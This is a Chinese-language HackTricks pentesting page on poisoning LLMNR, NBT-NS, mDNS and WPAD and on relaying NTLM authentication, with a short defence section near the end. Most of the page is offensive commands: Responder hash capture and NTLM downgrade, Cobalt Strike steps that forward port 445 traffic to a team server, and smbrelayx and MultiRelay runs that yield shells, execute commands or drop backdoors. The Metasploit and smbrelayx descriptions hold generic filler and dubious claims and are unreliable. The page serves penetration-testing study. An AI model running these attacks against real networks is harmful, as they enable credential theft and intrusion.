# 伪造LLMNR、NBT-NS、mDNS/DNS和WPAD以及中继攻击

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 网络协议

### LLMNR、NBT-NS和mDNS

Microsoft系统在DNS查找失败时使用链路本地组播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）进行本地主机解析。Apple Bonjour和Linux零配置实现使用多播DNS（mDNS）来发现网络中的系统。这些协议是未经身份验证的，并通过UDP广播消息，因此攻击者可以利用它们将用户引导到恶意服务。

您可以使用Responder来伪造被主机搜索的服务，发送虚假响应。\
在[如何使用Responder伪造服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)中阅读更多信息。

### WPAD

许多浏览器使用Web代理自动发现（WPAD）从网络加载代理设置。WPAD服务器通过特定的URL（例如_http://wpad.example.org/wpad.dat_）提供客户端代理设置，通过以下任一方式识别：

* DHCP，使用代码252条目[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS，在本地域中搜索_wpad_主机名
* Microsoft LLMNR和NBT-NS（在DNS查找失败的情况下）

Responder自动化了WPAD攻击-运行代理并通过DHCP、DNS、LLMNR和NBT-NS将客户端引导到恶意WPAD服务器。

## 协议中毒

### Responder - LLMNR、NBT-NS和MDNS

> Responder是一个LLMNR、NBT-NS和MDNS毒化工具。它将根据名称后缀（参见：[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)）回答特定的NBT-NS（NetBIOS名称服务）查询。默认情况下，该工具只会回答SMB的文件服务器服务请求。
>
> 这个概念是针对我们的答案进行定位，使我们在网络上更隐蔽。这也有助于确保我们不会破坏合法的NBT-NS行为。

* [**Responder**](https://github.com/lgandx/Responder)在kali中默认安装，配置文件位于\*\*`/etc/responder/Responder.conf` \*\*（在这里可以禁用恶意服务器）
* **Responder**将**在屏幕上打印哈希值**并将其写入位于`/usr/share/responder/logs`目录下的每个主机的日志文件中。哈希值以`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`的格式保存
* 您可以在[这里](https://github.com/lgandx/Responder-Windows)找到**Windows**的Responder
* Responder适用于**ipv4**和**ipv6**

#### Responder参数

Responder支持以下选项：
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder参数</summary>

* `-A`标志将我们置于**分析模式**，允许我们在不污染任何响应的情况下查看环境中的NBT-NS、BROWSER和LLMNR请求。
* 我们必须始终提供接口或IP。
* `-wf`将启动WPAD恶意代理服务器。
* `-f`将尝试指纹识别远程主机的操作系统和版本。
* 使用`-v`标志可以增加详细程度（在控制台打印大量附加数据）。
* `-F`和`-P`等选项可用于强制NTLM或基本身份验证和强制代理身份验证，但可能会导致登录提示，因此应谨慎使用。
* `-w`标志使用内置的WPAD代理服务器。这在大型组织中特别有效，因为它将捕获启动Internet Explorer的任何用户的所有HTTP请求，如果浏览器启用了[自动检测设置](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)。

</details>

#### 运行Responder

要运行默认的Responder行为，只需执行以下命令：
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
一种有趣的技术是使用responder在可能的情况下降级NTLM身份验证。这将允许**捕获NTLMv1挑战和响应**，而不是可以**轻松破解**的NTLMv2 [**按照此指南**](../../windows-hardening/ntlm/#ntlmv1-attack)**。**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
默认情况下，不会执行WPAD冒充攻击，但你可以通过以下方式执行：
```bash
responder -I <Iface> --wpad
```
您还可以使用您的IP地址来解析NetBIOS请求。并创建一个身份验证代理：
```bash
responder.py -I <interface> -Pv
```
你通常无法拦截NTLM哈希，但你可以轻松获取一些NTLM挑战和响应，然后使用例如john选项`--format=netntlmv2`来破解。

在kali中，默认的Responder安装的日志和挑战可以在`/usr/share/responder/logs`中找到。

#### Responder - DHCP中毒

Windows使用几个自定义的DHCP选项，如NetBIOS、WINS、WPAD设置。当工作站发送DHCP请求以获取其网络设置时，这些附加设置可以包含在DHCP响应中，以便实现简单的连接和名称解析。

欺骗DHCP响应而不造成干扰可能是具有挑战性的，因为你正在干扰工作站的网络配置。通常，你需要对目标子网有很好的了解，包括DNS服务器的位置、交换机的位置、路由表、域、子网掩码、DHCP服务器等等。任何这些设置的错误都会导致网络中断。

然而，欺骗DHCP响应具有独特的好处。它绝对比ARP中毒更隐蔽；一个单播响应足以永久中毒受害者的路由信息，而且在一个网络上通常会看到多个DHCP服务器运行。单播DHCP响应更难检测，一些交换机提供安全设置以防止DHCP监听，然而这些设置并不直观，当启用时经常配置错误。

> 这种攻击非常有效，并且可以获得确保的NTLMv1/2哈希。
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - 捕获凭证

Responder将**冒充使用所提到的协议的所有服务**。一旦某个用户尝试访问使用这些协议解析的服务，**他将尝试对Responder进行身份验证**，并且Responder将能够**捕获**“凭证”（很可能是**NTLMv2 Challenge/Response**）：

可以尝试降级到NetNTLMv1或尝试禁用ESS。

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveigh是一个PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS欺骗和中间人工具，旨在帮助受限于Windows系统的渗透测试人员/红队人员。

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)是一个PowerShell脚本，现在是一个具有与Responder相同主要功能的C#二进制文件。有一个[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)列出了所有参数和使用说明。\
还可以在[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)中找到另一个版本。

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

或者使用更多选项运行它：
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
或者运行C#版本：
```bash
Inveigh.exe
```
## NTLM中继攻击

这种攻击将内部网络上的**SMB身份验证会话**中继到一个**目标机器**。如果身份验证**会话成功**，它将自动将您置于一个**系统**的**shell**中。请注意，中继的身份验证必须来自一个**具有对中继主机的本地管理员访问权限的用户**，并且**必须禁用SMB签名**。

### 445端口转发和隧道

{% hint style="warning" %}
如果您可以**在网络内引入一台机器**，则可以使用以下部分中的任何**工具**来执行中继攻击，您不需要关心这个。
{% endhint %}

然而，在红队中，情况并非如此，通常您需要**将Windows机器的445端口的流量转发到您的机器**，并执行以下任何工具之一，然后**通过代理将该工具的流量路由回来**，以达到攻击内部机器的目的。

工具[**PortBender**](https://github.com/praetorian-inc/PortBender)是一个驱动程序，用于将目标端口**445的流量重定向到另一个端口**（例如8445），我们可以**绑定**该端口。为了加载驱动程序，它需要**本地管理员访问权限**。使用`cd C:\Windows\System32\drivers`是有道理的，因为这是大多数Windows驱动程序的位置。
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit

Metasploit是一款广泛使用的渗透测试工具，它提供了一系列强大的功能和模块，用于发现和利用系统中的漏洞。Metasploit可以帮助渗透测试人员评估目标系统的安全性，并提供了自动化的漏洞利用和渗透测试过程。

Metasploit的主要特点包括：

- 模块化架构：Metasploit使用模块化的架构，使用户可以根据需要选择和组合不同的模块，以实现特定的攻击和渗透测试目标。
- 漏洞利用：Metasploit提供了大量的漏洞利用模块，用于发现和利用系统中的已知漏洞。这些模块可以自动化执行漏洞利用过程，从而简化渗透测试的流程。
- 社区驱动：Metasploit是一个开源项目，拥有庞大的社区支持。这意味着用户可以从社区中获取新的模块和漏洞利用技术，并与其他渗透测试人员分享经验和知识。
- 多平台支持：Metasploit可以在多个操作系统上运行，包括Windows、Linux和Mac OS X。这使得用户可以在不同的环境中使用Metasploit进行渗透测试。
- 命令行和图形界面：Metasploit提供了命令行和图形界面两种方式进行操作。用户可以根据自己的喜好选择适合自己的界面。

总之，Metasploit是一款功能强大的渗透测试工具，可以帮助渗透测试人员发现和利用系统中的漏洞，评估目标系统的安全性。它的模块化架构和社区支持使其成为渗透测试人员的首选工具之一。
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx

smbrelayx是一个工具，用于执行SMB中继攻击。该攻击利用了SMB协议中的漏洞，通过欺骗目标系统，使其将身份验证请求发送到攻击者控制的中继服务器上。这使得攻击者能够获取目标系统的凭据，并进一步入侵网络。

使用smbrelayx，攻击者可以在目标网络中执行以下操作：

1. **中继攻击**：攻击者可以中继目标系统与其他系统之间的SMB流量，从而获取目标系统的凭据。

2. **NTLM散列注入**：攻击者可以注入恶意的NTLM散列，以获取目标系统的凭据。

3. **SMB会话劫持**：攻击者可以劫持目标系统的SMB会话，获取目标系统的凭据。

smbrelayx是一个功能强大的工具，但需要谨慎使用。攻击者应该在合法授权的范围内使用该工具，并遵守法律和道德规范。
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

如果你想使用**MultiRelay**，请前往_**/usr/share/responder/tools**_并执行MultiRelay (`-t <目标IP> -u <用户>`)：
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### 强制 NTLM 登录

在 Windows 中，您**可能能够强制某些特权帐户对任意机器进行身份验证**。阅读以下页面以了解详情：

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## 解决方案

### 禁用 LLMNR

要在域中为 DNS 客户端禁用 LLMNR，请打开 gpedit.msc。\
导航到计算机配置->管理模板->网络->DNS 客户端。\
找到选项“关闭多播名称解析”并单击“策略设置”：

![](../../.gitbook/assets/1.jpg)

新窗口打开后，启用此选项，点击应用并点击确定：

![](../../.gitbook/assets/2.jpg)

### **禁用 NBT-NS**

禁用 NBT-NS 的一种方法是使用 DHCP 范围选项。

如果使用 Microsoft 的 DHCP 服务器，请选择要禁用 NBT-NS 的范围。右键单击“范围选项”，然后单击“配置选项”。在下面的示例中，我要禁用 NBT-NS 的 DHCP 范围是 192.168.1.100。

![](../../.gitbook/assets/3.jpg)

在范围选项窗口中，导航到高级选项卡，将下拉窗口更改为“Microsoft Windows 2000 选项”：

![](../../.gitbook/assets/4.jpg)

从列表中选择选项“001 Microsoft Disable Netbios Option”，将其值更改为“0x2”，点击应用，然后点击确定：

![](../../.gitbook/assets/5.jpg)

### WPAD

为了防止 WPAD 攻击，您可以在 DNS 区域中添加一个名为 "wpad" 的条目。请注意，DNS 条目不需要指向有效的 WPAD 服务器。只要查询得到解析，攻击就会被阻止。

### 多重中继

1\. **强制所有本地 Windows 机器上启用 SMB 签名**。此设置将在每个 SMB 会话上进行数字签名，强制客户端和服务器在继续之前验证数据包的来源。此设置仅在域控制器上默认启用。以下来自 Microsoft 的文章详细介绍了这些设置（可以通过组策略启用），以及如何实施它们。

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **审查并确保本地网络上的用户只能远程登录到必要的机器**。例如：Sally 只能登录到 Sally 的工作站。如果攻击者拦截了 Sally 的 SMB 认证会话，他们无法将会话中继到任何工作站，使此方法无效。

3\. **尽可能限制本地网络上的 NTLM 认证**。此攻击无法利用 Kerberos 认证，因此通过限制 NTLM 的使用量，可以大大阻碍此攻击。Microsoft 提供了有关如何实现此目标的信息，但请注意...如果由于某种原因导致 Kerberos 认证失败，它通常会回退到 NTLM。如果完全禁用它，您的网络可能会陷入停滞。

4\. **防止未经授权的用户进入您的网络**。内部威胁可能不会利用 SMB 中继攻击，因为他们已经拥有网络凭据。通过加强物理安全策略，使用 ACL 和 MAC 过滤器防止网络上的恶意设备，并确保适当的网络分割，可以大大限制此攻击的威胁。

## 参考资料

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **图片来源：**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在 HackTricks 中**宣传您的公司**吗？或者您想获得最新版本的 PEASS 或下载 HackTricks 的 PDF 吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 上 **关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>
